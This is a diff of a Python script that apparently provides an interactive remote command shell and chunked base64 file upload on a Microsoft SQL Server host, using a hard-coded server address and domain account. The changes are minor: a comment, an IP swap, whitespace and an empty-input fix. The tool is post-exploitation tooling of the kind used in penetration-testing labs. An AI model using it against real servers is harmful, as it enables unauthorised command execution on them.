@@ -5,6 +5,7 @@ from __future__ import print_function
 # To upload a file type: UPLOAD local_path remote_path
 # e.g. UPLOAD myfile.txt C:\temp\myfile.txt
 # If you omit the remote_path it uploads the file on the current working folder.
+# Be aware that pymssql has some serious memory leak issues when the connection fails (see: https://github.com/pymssql/pymssql/issues/512).
 import _mssql
 import base64
 import shlex
@@ -16,7 +17,7 @@ try: input = raw_input
 except NameError: pass
 
 
-MSSQL_SERVER="10.13.38.11"
+MSSQL_SERVER="10.10.10.10"
 MSSQL_USERNAME = "Domain\\sa_user"
 MSSQL_PASSWORD = "**********"
 BUFFER_SIZE = 5*1024
@@ -49,7 +50,7 @@ def upload(mssql, stored_cwd, local_path, remote_path):
         data = f.read()
         md5sum = hashlib.md5(data).hexdigest()
         b64enc_data = b"".join(base64.encodestring(data).split()).decode()
-
+        
     print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
     for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
         cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
@@ -84,6 +85,8 @@ def shell():
         
         while True:
             cmd = input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
+            if not cmd:
+                cmd = "call" # Dummy cmd command
             if cmd.lower()[0:4] == "exit":
                 mssql.close()
                 return
@@ -106,6 +109,7 @@ def shell():
     finally:
         if mssql:
             mssql.close()
+
 
 shell()
 sys.exit()
